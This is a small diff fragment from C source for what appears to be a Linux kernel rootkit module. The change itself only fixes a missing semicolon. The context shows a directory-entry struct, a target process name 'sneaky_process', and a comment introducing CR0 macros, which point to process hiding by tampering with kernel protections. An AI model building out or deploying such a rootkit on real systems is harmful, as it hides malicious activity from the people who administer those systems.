@@ -17,7 +17,7 @@ struct linux_dirent {
   char           d_name[];
   };
 static char* processname = "sneaky_process";
-static char proc_dir[50] = "/proc/" 
+static char proc_dir[50] = "/proc/" ;
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
